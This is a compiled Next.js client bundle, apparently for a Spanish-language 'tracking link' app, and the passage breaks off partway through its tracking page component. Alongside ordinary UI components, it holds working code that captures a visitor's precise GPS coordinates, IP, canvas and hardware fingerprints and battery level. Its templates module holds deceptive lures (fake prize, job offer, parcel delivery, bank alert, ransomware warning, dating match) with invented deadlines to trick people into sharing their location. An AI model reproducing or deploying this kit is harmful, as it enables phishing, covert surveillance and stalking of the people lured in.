(globalThis.TURBOPACK = globalThis.TURBOPACK || []).push([typeof document === "object" ? document.currentScript : undefined, {

"[project]/src/lib/utils.ts [app-client] (ecmascript)": ((__turbopack_context__) => {
"use strict";

var { g: global, __dirname, k: __turbopack_refresh__, m: module } = __turbopack_context__;
{
__turbopack_context__.s({
    "cn": (()=>cn)
});
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$clsx$2f$dist$2f$clsx$2e$mjs__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/clsx/dist/clsx.mjs [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$tailwind$2d$merge$2f$dist$2f$bundle$2d$mjs$2e$mjs__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/tailwind-merge/dist/bundle-mjs.mjs [app-client] (ecmascript)");
;
;
function cn(...inputs) {
    return (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$tailwind$2d$merge$2f$dist$2f$bundle$2d$mjs$2e$mjs__$5b$app$2d$client$5d$__$28$ecmascript$29$__["twMerge"])((0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$clsx$2f$dist$2f$clsx$2e$mjs__$5b$app$2d$client$5d$__$28$ecmascript$29$__["clsx"])(inputs));
}
if (typeof globalThis.$RefreshHelpers$ === 'object' && globalThis.$RefreshHelpers !== null) {
    __turbopack_context__.k.registerExports(module, globalThis.$RefreshHelpers$);
}
}}),
"[project]/src/components/ui/card.tsx [app-client] (ecmascript)": ((__turbopack_context__) => {
"use strict";

var { g: global, __dirname, k: __turbopack_refresh__, m: module } = __turbopack_context__;
{
__turbopack_context__.s({
    "Card": (()=>Card),
    "CardAction": (()=>CardAction),
    "CardContent": (()=>CardContent),
    "CardDescription": (()=>CardDescription),
    "CardFooter": (()=>CardFooter),
    "CardHeader": (()=>CardHeader),
    "CardTitle": (()=>CardTitle)
});
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/compiled/react/jsx-dev-runtime.js [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/utils.ts [app-client] (ecmascript)");
;
;
function Card({ className, ...props }) {
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
        "data-slot": "card",
        className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["cn"])("bg-card text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm", className),
        ...props
    }, void 0, false, {
        fileName: "[project]/src/components/ui/card.tsx",
        lineNumber: 7,
        columnNumber: 5
    }, this);
}
_c = Card;
function CardHeader({ className, ...props }) {
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
        "data-slot": "card-header",
        className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["cn"])("@container/card-header grid auto-rows-min grid-rows-[auto_auto] items-start gap-1.5 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6", className),
        ...props
    }, void 0, false, {
        fileName: "[project]/src/components/ui/card.tsx",
        lineNumber: 20,
        columnNumber: 5
    }, this);
}
_c1 = CardHeader;
function CardTitle({ className, ...props }) {
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
        "data-slot": "card-title",
        className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["cn"])("leading-none font-semibold", className),
        ...props
    }, void 0, false, {
        fileName: "[project]/src/components/ui/card.tsx",
        lineNumber: 33,
        columnNumber: 5
    }, this);
}
_c2 = CardTitle;
function CardDescription({ className, ...props }) {
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
        "data-slot": "card-description",
        className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["cn"])("text-muted-foreground text-sm", className),
        ...props
    }, void 0, false, {
        fileName: "[project]/src/components/ui/card.tsx",
        lineNumber: 43,
        columnNumber: 5
    }, this);
}
_c3 = CardDescription;
function CardAction({ className, ...props }) {
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
        "data-slot": "card-action",
        className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["cn"])("col-start-2 row-span-2 row-start-1 self-start justify-self-end", className),
        ...props
    }, void 0, false, {
        fileName: "[project]/src/components/ui/card.tsx",
        lineNumber: 53,
        columnNumber: 5
    }, this);
}
_c4 = CardAction;
function CardContent({ className, ...props }) {
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
        "data-slot": "card-content",
        className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["cn"])("px-6", className),
        ...props
    }, void 0, false, {
        fileName: "[project]/src/components/ui/card.tsx",
        lineNumber: 66,
        columnNumber: 5
    }, this);
}
_c5 = CardContent;
function CardFooter({ className, ...props }) {
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
        "data-slot": "card-footer",
        className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["cn"])("flex items-center px-6 [.border-t]:pt-6", className),
        ...props
    }, void 0, false, {
        fileName: "[project]/src/components/ui/card.tsx",
        lineNumber: 76,
        columnNumber: 5
    }, this);
}
_c6 = CardFooter;
;
var _c, _c1, _c2, _c3, _c4, _c5, _c6;
__turbopack_context__.k.register(_c, "Card");
__turbopack_context__.k.register(_c1, "CardHeader");
__turbopack_context__.k.register(_c2, "CardTitle");
__turbopack_context__.k.register(_c3, "CardDescription");
__turbopack_context__.k.register(_c4, "CardAction");
__turbopack_context__.k.register(_c5, "CardContent");
__turbopack_context__.k.register(_c6, "CardFooter");
if (typeof globalThis.$RefreshHelpers$ === 'object' && globalThis.$RefreshHelpers !== null) {
    __turbopack_context__.k.registerExports(module, globalThis.$RefreshHelpers$);
}
}}),
"[project]/src/components/ui/button.tsx [app-client] (ecmascript)": ((__turbopack_context__) => {
"use strict";

var { g: global, __dirname, k: __turbopack_refresh__, m: module } = __turbopack_context__;
{
__turbopack_context__.s({
    "Button": (()=>Button),
    "buttonVariants": (()=>buttonVariants)
});
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/compiled/react/jsx-dev-runtime.js [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f40$radix$2d$ui$2f$react$2d$slot$2f$dist$2f$index$2e$mjs__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/@radix-ui/react-slot/dist/index.mjs [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$class$2d$variance$2d$authority$2f$dist$2f$index$2e$mjs__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/class-variance-authority/dist/index.mjs [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/utils.ts [app-client] (ecmascript)");
;
;
;
;
const buttonVariants = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$class$2d$variance$2d$authority$2f$dist$2f$index$2e$mjs__$5b$app$2d$client$5d$__$28$ecmascript$29$__["cva"])("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive", {
    variants: {
        variant: {
            default: "bg-primary text-primary-foreground shadow-xs hover:bg-primary/90",
            destructive: "bg-destructive text-white shadow-xs hover:bg-destructive/90 focus-visible:ring-destructive/20 dark:focus-visible:ring-destructive/40 dark:bg-destructive/60",
            outline: "border bg-background shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50",
            secondary: "bg-secondary text-secondary-foreground shadow-xs hover:bg-secondary/80",
            ghost: "hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50",
            link: "text-primary underline-offset-4 hover:underline"
        },
        size: {
            default: "h-9 px-4 py-2 has-[>svg]:px-3",
            sm: "h-8 rounded-md gap-1.5 px-3 has-[>svg]:px-2.5",
            lg: "h-10 rounded-md px-6 has-[>svg]:px-4",
            icon: "size-9"
        }
    },
    defaultVariants: {
        variant: "default",
        size: "default"
    }
});
function Button({ className, variant, size, asChild = false, ...props }) {
    const Comp = asChild ? __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f40$radix$2d$ui$2f$react$2d$slot$2f$dist$2f$index$2e$mjs__$5b$app$2d$client$5d$__$28$ecmascript$29$__["Slot"] : "button";
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(Comp, {
        "data-slot": "button",
        className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["cn"])(buttonVariants({
            variant,
            size,
            className
        })),
        ...props
    }, void 0, false, {
        fileName: "[project]/src/components/ui/button.tsx",
        lineNumber: 51,
        columnNumber: 5
    }, this);
}
_c = Button;
;
var _c;
__turbopack_context__.k.register(_c, "Button");
if (typeof globalThis.$RefreshHelpers$ === 'object' && globalThis.$RefreshHelpers !== null) {
    __turbopack_context__.k.registerExports(module, globalThis.$RefreshHelpers$);
}
}}),
"[project]/src/lib/services/geo-service.ts [app-client] (ecmascript)": ((__turbopack_context__) => {
"use strict";

var { g: global, __dirname, k: __turbopack_refresh__, m: module } = __turbopack_context__;
{
__turbopack_context__.s({
    "GeoService": (()=>GeoService)
});
class GeoService {
    static watchId = null;
    static async getCurrentPosition(options = {}) {
        if (!navigator.geolocation) {
            throw this.createError({
                code: 0,
                message: "Geolocalización no soportada en este navegador",
                type: 'unsupported'
            });
        }
        const defaultOptions = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
            ...options
        };
        try {
            const position = await new Promise((resolve, reject)=>{
                navigator.geolocation.getCurrentPosition(resolve, reject, defaultOptions);
            });
            return this.formatPosition(position);
        } catch (error) {
            throw this.handleGeolocationError(error);
        }
    }
    static watchPosition(onSuccess, onError, options = {}) {
        if (!navigator.geolocation) {
            onError(this.createError({
                code: 0,
                message: "Geolocalización no soportada",
                type: 'unsupported'
            }));
            return ()=>{};
        }
        const defaultOptions = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
            ...options
        };
        this.watchId = navigator.geolocation.watchPosition((position)=>{
            try {
                const formattedPosition = this.formatPosition(position);
                onSuccess(formattedPosition);
            } catch (error) {
                onError(this.handleGeolocationError(error));
            }
        }, (error)=>{
            onError(this.handleGeolocationError(error));
        }, defaultOptions);
        return ()=>{
            if (this.watchId !== null) {
                navigator.geolocation.clearWatch(this.watchId);
                this.watchId = null;
            }
        };
    }
    static getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            fingerprint: this.generateFingerprint()
        };
    }
    static async getIPInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (!response.ok) throw new Error('Error al obtener información IP');
            const data = await response.json();
            return {
                ip: data.ip,
                country: data.country_name,
                city: data.city,
                latitude: data.latitude,
                longitude: data.longitude
            };
        } catch (error) {
            console.error('Error obteniendo información IP:', error);
            return {
                ip: 'desconocida'
            };
        }
    }
    static async getLocationDetails(latitude, longitude) {
        try {
            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
            if (!response.ok) {
                throw new Error('Error al obtener detalles de ubicación');
            }
            const data = await response.json();
            return {
                country: data.address.country || 'Desconocido',
                city: data.address.city || data.address.town || data.address.village || 'Desconocido',
                address: data.display_name || 'Dirección no disponible'
            };
        } catch (error) {
            console.error('Error obteniendo detalles de ubicación:', error);
            return {
                country: 'Desconocido',
                city: 'Desconocido',
                address: 'Dirección no disponible'
            };
        }
    }
    static formatPosition(position) {
        return {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            heading: position.coords.heading,
            timestamp: position.timestamp
        };
    }
    static handleGeolocationError(error) {
        let type = 'unknown';
        let message = 'Error desconocido al obtener ubicación';
        switch(error.code){
            case 1:
                type = 'permission';
                message = 'Acceso a la ubicación denegado. Por favor, permite el acceso a tu ubicación en la configuración del navegador.';
                break;
            case 2:
                type = 'position';
                message = 'No se pudo determinar tu ubicación. Verifica tu conexión GPS y a internet.';
                break;
            case 3:
                type = 'timeout';
                message = 'Tiempo de espera agotado al intentar obtener la ubicación.';
                break;
        }
        return this.createError({
            code: error.code,
            message,
            type
        });
    }
    static createError({ code, message, type }) {
        return {
            code,
            message,
            type
        };
    }
    static generateFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.language,
            new Date().getTimezoneOffset(),
            navigator.hardwareConcurrency || 'unknown',
            window.screen.colorDepth,
            window.screen.pixelDepth,
            window.screen.width,
            window.screen.height,
            navigator.vendor,
            navigator.platform,
            "canvas:" + this.getCanvasFingerprint()
        ];
        return components.join('|');
    }
    static getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            if (!ctx) return 'no-canvas';
            canvas.width = 200;
            canvas.height = 50;
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('GeoTracker:2024', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Location:Verified', 4, 17);
            return canvas.toDataURL();
        } catch (e) {
            return 'canvas-error';
        }
    }
    static getAccuracyDescription(accuracy) {
        if (accuracy <= 10) return "Excelente (GPS)";
        if (accuracy <= 30) return "Buena";
        if (accuracy <= 100) return "Moderada";
        if (accuracy <= 500) return "Baja";
        return "Muy baja";
    }
    static getAccuracyColor(accuracy) {
        if (accuracy <= 10) return "text-green-500";
        if (accuracy <= 30) return "text-blue-500";
        if (accuracy <= 100) return "text-yellow-500";
        if (accuracy <= 500) return "text-orange-500";
        return "text-red-500";
    }
}
if (typeof globalThis.$RefreshHelpers$ === 'object' && globalThis.$RefreshHelpers !== null) {
    __turbopack_context__.k.registerExports(module, globalThis.$RefreshHelpers$);
}
}}),
"[project]/src/lib/services/tracking-service.ts [app-client] (ecmascript)": ((__turbopack_context__) => {
"use strict";

var { g: global, __dirname, k: __turbopack_refresh__, m: module } = __turbopack_context__;
{
__turbopack_context__.s({
    "TrackingService": (()=>TrackingService)
});
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$services$2f$geo$2d$service$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/services/geo-service.ts [app-client] (ecmascript)");
;
class TrackingService {
    static STORAGE_KEY = 'tracking_data';
    static API_BASE = "/api";
    static async getStoredData() {
        try {
            const data = localStorage.getItem(this.STORAGE_KEY);
            if (data) {
                return JSON.parse(data);
            }
        } catch (error) {
            console.error("Error reading stored data:", error);
        }
        return {
            links: [],
            captures: []
        };
    }
    static async saveData(data) {
        try {
            localStorage.setItem(this.STORAGE_KEY, JSON.stringify(data));
        } catch (error) {
            console.error("Error saving data:", error);
        }
    }
    static async createTrackingLink(templateType) {
        try {
            const response = await fetch(`${this.API_BASE}/tracking-links`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    templateType
                })
            });
            if (!response.ok) {
                throw new Error("Error al crear el enlace de rastreo");
            }
            const newLink = await response.json();
            // Guardar en almacenamiento local
            const data = await this.getStoredData();
            data.links.push(newLink);
            await this.saveData(data);
            return newLink;
        } catch (error) {
            console.error("Error creating tracking link:", error);
            throw error;
        }
    }
    static async getTrackingLinks() {
        try {
            const data = await this.getStoredData();
            return data.links;
        } catch (error) {
            console.error("Error fetching tracking links:", error);
            throw error;
        }
    }
    static async getLocationCaptures() {
        try {
            const data = await this.getStoredData();
            return data.captures;
        } catch (error) {
            console.error("Error fetching location captures:", error);
            throw error;
        }
    }
    static async captureLocation(linkId, shortCode) {
        try {
            // Obtener datos de ubicación completos
            const locationData = await __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$services$2f$geo$2d$service$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["GeoService"].getFullLocationData();
            // Obtener información del dispositivo
            const deviceInfo = await this.getDeviceInfo();
            const capture = {
                id: `capture-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
                linkId,
                latitude: locationData.latitude,
                longitude: locationData.longitude,
                accuracy: locationData.accuracy,
                altitude: locationData.altitude,
                speed: locationData.speed,
                heading: locationData.heading,
                city: locationData.city || null,
                country: locationData.country || null,
                capturedAt: new Date().toISOString(),
                deviceInfo: {
                    ipAddress: locationData.ip || deviceInfo.ipAddress,
                    userAgent: deviceInfo.userAgent,
                    deviceFingerprint: deviceInfo.deviceFingerprint,
                    browserInfo: deviceInfo.browserInfo,
                    batteryLevel: deviceInfo.batteryLevel,
                    networkType: deviceInfo.networkType,
                    platform: deviceInfo.platform,
                    screenResolution: deviceInfo.screenResolution
                }
            };
            // Guardar en almacenamiento local
            const data = await this.getStoredData();
            data.captures.push(capture);
            await this.saveData(data);
            // Actualizar estadísticas del enlace
            const linkIndex = data.links.findIndex((l)=>l.id === linkId);
            if (linkIndex !== -1) {
                data.links[linkIndex].captures++;
                await this.saveData(data);
            }
            return capture;
        } catch (error) {
            console.error("Error capturing location:", error);
            throw error;
        }
    }
    static async getDeviceInfo() {
        const info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            ipAddress: "0.0.0.0",
            browserInfo: this.getBrowserInfo(),
            deviceFingerprint: await this.generateDeviceFingerprint(),
            networkType: navigator.connection?.type || "unknown"
        };
        // Obtener nivel de batería si está disponible
        try {
            const battery = await navigator.getBattery?.();
            if (battery) {
                info.batteryLevel = battery.level * 100;
            }
        } catch (e) {
            console.warn("Battery API not available");
        }
        return info;
    }
    static getBrowserInfo() {
        const ua = navigator.userAgent;
        const browserRegex = /(chrome|safari|firefox|edge|opera|ie)\/([\d.]+)/i;
        const match = ua.match(browserRegex);
        if (match) {
            return `${match[1].charAt(0).toUpperCase() + match[1].slice(1)} ${match[2]}`;
        }
        return "Unknown Browser";
    }
    static async generateDeviceFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.language,
            new Date().getTimezoneOffset(),
            screen.width,
            screen.height,
            screen.colorDepth,
            navigator.hardwareConcurrency,
            navigator.deviceMemory,
            navigator.platform,
            navigator.connection?.type
        ];
        const fingerprint = components.join('|');
        const encoder = new TextEncoder();
        const data = encoder.encode(fingerprint);
        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map((b)=>b.toString(16).padStart(2, '0')).join('');
    }
}
if (typeof globalThis.$RefreshHelpers$ === 'object' && globalThis.$RefreshHelpers !== null) {
    __turbopack_context__.k.registerExports(module, globalThis.$RefreshHelpers$);
}
}}),
"[project]/src/config/templates.ts [app-client] (ecmascript)": ((__turbopack_context__) => {
"use strict";

var { g: global, __dirname, k: __turbopack_refresh__, m: module } = __turbopack_context__;
{
__turbopack_context__.s({
    "getTemplate": (()=>getTemplate),
    "getTemplateBgColor": (()=>getTemplateBgColor),
    "getTemplateIcon": (()=>getTemplateIcon),
    "getTemplateTypes": (()=>getTemplateTypes),
    "getTemplateUrgencyColor": (()=>getTemplateUrgencyColor),
    "templates": (()=>templates)
});
const templates = {
    premio: {
        title: "🎁 ¡Felicitaciones!",
        subtitle: "Has sido seleccionado como ganador",
        message: "Acabas de ganar un iPhone 15 Pro Max en nuestro sorteo mensual. Para coordinar la entrega inmediata, necesitamos verificar tu ubicación. ¡El premio debe ser reclamado en las próximas 2 horas!",
        buttonText: "Reclamar Premio Ahora",
        bgColor: "from-green-900 to-gray-900",
        icon: "🎁",
        description: "Plantilla de premio ganador",
        urgencyLevel: "high",
        validityPeriod: "2 horas"
    },
    empleo: {
        title: "💼 Oferta Laboral Urgente",
        subtitle: "Posición Disponible - $5,000 USD/mes",
        message: "Una importante empresa multinacional necesita cubrir una posición de forma inmediata. Tu perfil ha sido preseleccionado. Necesitamos verificar tu ubicación para programar una entrevista urgente para hoy.",
        buttonText: "Confirmar Disponibilidad",
        bgColor: "from-blue-900 to-gray-900",
        icon: "💼",
        description: "Plantilla de oferta laboral",
        urgencyLevel: "high",
        validityPeriod: "24 horas"
    },
    delivery: {
        title: "📦 Paquete en Espera",
        subtitle: "Entrega Express Pendiente",
        message: "Tenemos un paquete prioritario para ti que requiere entrega inmediata. El repartidor está en tu zona pero necesita confirmar tu ubicación exacta para la entrega. El paquete volverá a almacén en 30 minutos.",
        buttonText: "Recibir Ahora",
        bgColor: "from-yellow-900 to-gray-900",
        icon: "📦",
        description: "Plantilla de entrega pendiente",
        urgencyLevel: "high",
        validityPeriod: "30 minutos"
    },
    banco: {
        title: "🏦 ⚠️ Alerta de Seguridad",
        subtitle: "Verificación Urgente Requerida",
        message: "Detectamos un intento de acceso no autorizado a tu cuenta desde una ubicación desconocida. Verifica tu ubicación actual inmediatamente para prevenir el bloqueo permanente de tu cuenta.",
        buttonText: "Verificar Cuenta",
        bgColor: "from-red-900 to-gray-900",
        icon: "🏦",
        description: "Plantilla de alerta bancaria",
        urgencyLevel: "high",
        validityPeriod: "15 minutos"
    },
    actualizacion: {
        title: "⚠️ Actualización Crítica",
        subtitle: "Seguridad Comprometida",
        message: "Tu dispositivo ha sido identificado como vulnerable a un ataque de ransomware. Necesitamos verificar tu ubicación para aplicar un parche de seguridad urgente y proteger tus datos.",
        buttonText: "Proteger Dispositivo",
        bgColor: "from-purple-900 to-gray-900",
        icon: "🔒",
        description: "Plantilla de actualización",
        urgencyLevel: "high",
        validityPeriod: "1 hora"
    },
    social: {
        title: "💝 Match Encontrado",
        subtitle: "¡Alguien especial te busca!",
        message: "Una persona muy compatible con tu perfil está cerca de ti ahora mismo y quiere conocerte. Por tu seguridad, necesitamos verificar tu ubicación antes de revelar su identidad.",
        buttonText: "Ver Perfil",
        bgColor: "from-pink-900 to-gray-900",
        icon: "�",
        description: "Plantilla de red social",
        urgencyLevel: "medium",
        validityPeriod: "5 minutos"
    },
    cupon: {
        title: "🎫 Descuento VIP",
        subtitle: "Oferta Exclusiva",
        message: "¡Has sido seleccionado! Tienes un cupón de $500 para usar en tiendas cercanas. Verifica tu ubicación para activar el descuento inmediatamente. ¡Solo válido para los próximos 15 minutos!",
        buttonText: "Activar Descuento",
        bgColor: "from-orange-900 to-gray-900",
        icon: "🎫",
        description: "Plantilla de cupón",
        urgencyLevel: "medium",
        validityPeriod: "15 minutos"
    },
    wifi: {
        title: "📶 WiFi Gratis 5G",
        subtitle: "Red Premium Disponible",
        message: "Detectamos una red WiFi 5G de alta velocidad cerca de ti. Verifica tu ubicación para conectarte automáticamente y disfrutar de internet ilimitado gratis por 24 horas.",
        buttonText: "Conectar Ahora",
        bgColor: "from-cyan-900 to-gray-900",
        icon: "📶",
        description: "Plantilla de WiFi gratis",
        urgencyLevel: "low",
        validityPeriod: "5 minutos"
    }
};
const getTemplate = (type)=>{
    return templates[type] || templates.premio;
};
const getTemplateTypes = ()=>{
    return Object.keys(templates);
};
const getTemplateIcon = (type)=>{
    return templates[type]?.icon || "🎯";
};
const getTemplateBgColor = (type)=>{
    return templates[type]?.bgColor || "from-gray-900 to-black";
};
const getTemplateUrgencyColor = (level)=>{
    switch(level){
        case "high":
            return "text-red-500";
        case "medium":
            return "text-yellow-500";
        case "low":
            return "text-green-500";
        default:
            return "text-gray-500";
    }
};
if (typeof globalThis.$RefreshHelpers$ === 'object' && globalThis.$RefreshHelpers !== null) {
    __turbopack_context__.k.registerExports(module, globalThis.$RefreshHelpers$);
}
}}),
"[project]/src/app/track/[shortCode]/page.tsx [app-client] (ecmascript)": ((__turbopack_context__) => {
"use strict";

var { g: global, __dirname, k: __turbopack_refresh__, m: module } = __turbopack_context__;
{
__turbopack_context__.s({
    "default": (()=>TrackPage)
});
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/compiled/react/jsx-dev-runtime.js [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/compiled/react/index.js [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/components/ui/card.tsx [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$button$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/components/ui/button.tsx [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$services$2f$tracking$2d$service$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/services/tracking-service.ts [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$services$2f$geo$2d$service$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/services/geo-service.ts [app-client] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$config$2f$templates$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/config/templates.ts [app-client] (ecmascript)");
;
var _s = __turbopack_context__.k.signature();
"use client";
;
;
;
;
;
;
function TrackPage({ params }) {
    _s();
    const [link, setLink] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])(null);
    const [error, setError] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])(null);
